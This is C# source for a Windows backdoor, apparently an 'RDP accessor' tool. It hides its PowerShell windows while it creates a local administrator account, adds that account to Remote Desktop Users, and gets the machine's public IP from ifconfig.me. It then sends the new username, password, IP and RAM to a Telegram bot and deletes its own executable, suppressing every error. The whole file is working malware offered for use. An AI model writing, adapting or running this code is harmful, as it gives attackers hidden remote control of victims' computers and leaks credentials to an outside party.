using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;

namespace localhost
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            try
            {
                Program.createAdminUser();
                Program.allowRemoteAccess();
                Program.SendMessage("Job's done!");
            }
            catch
            {
                // Ошибки не выводятся, вызывается selfRemove
                Program.selfRemove(fileName, 1);
                return;
            }

            Program.selfRemove(fileName, 1);
        }

        private static void createAdminUser()
        {
            try
            {
                Program.AppendToSummary("Created Admin User");
                Program.RunPS($"net user {Program.newUserName} {Program.newUserPass} /add");
                Program.RunPS($"net localgroup administrators {Program.newUserName} /add");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static void allowRemoteAccess()
        {
            try
            {
                Program.AppendToSummary("Allowed Remote Access");
                Program.RunPS($"net localgroup \"Remote Desktop Users\" {Program.newUserName} /add");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static void AppendToSummary(string text)
        {
            Program.summaryMessage = Program.summaryMessage + text + Environment.NewLine;
        }

        private static void SendMessage(string text)
        {
            try
            {
                string ram = Program.GetRAM();
                string value = string.Concat(new string[]
                {
                    string.Concat(new string[]
                    {
                        "====[New Admin User Information]====",
                        Environment.NewLine,
                        Program.summaryMessage,
                        "[+]  Username => ",
                        Program.newUserName,
                        "\n[+]  Password => ",
                        Program.newUserPass,
                        "\n[+]  IP => ",
                        Program.Get("https://www.ifconfig.me/"),
                        "\n[+]  RAM => ",
                        ram,
                        "\n===[ ]===[ RDP ACCESSOR LOG ]===[ ]==="
                    })
                });
                using (WebClient webClient = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    webClient.DownloadString(string.Concat(new string[]
                    {
                        "https://api.telegram.org/bot",
                        Program.Token,
                        "/sendMessage?chat_id=",
                        Program.ID,
                        "&text=",
                        WebUtility.UrlEncode(value)
                    }));
                }
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static void RunPS(string args)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            process.WaitForExit();
        }

        private static string GetRAM()
        {
            try
            {
                int num = 0;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
                    {
                        if (enumerator.MoveNext())
                        {
                            ManagementObject managementObject = (ManagementObject)enumerator.Current;
                            double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                            num = (int)(num2 / 1048576.0) - 1;
                        }
                    }
                }
                return num.ToString("#,GB");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static string Get(string uri)
        {
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(uri);
            httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
            string result;
            using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (Stream responseStream = httpWebResponse.GetResponseStream())
                {
                    using (StreamReader streamReader = new StreamReader(responseStream))
                    {
                        result = streamReader.ReadToEnd();
                    }
                }
            }
            return result;
        }

        private static void selfRemove(string fileName, int delaySecond = 2)
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                Verb = "runas",
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }

        public static string Token = "TOKENBOT";
        public static string ID = "CHATIDUSER";
        public static string newUserName = "RDPUSERNAME";
        public static string newUserPass = "RDPPASSWORD";
        public static string summaryMessage = "";
    }
}
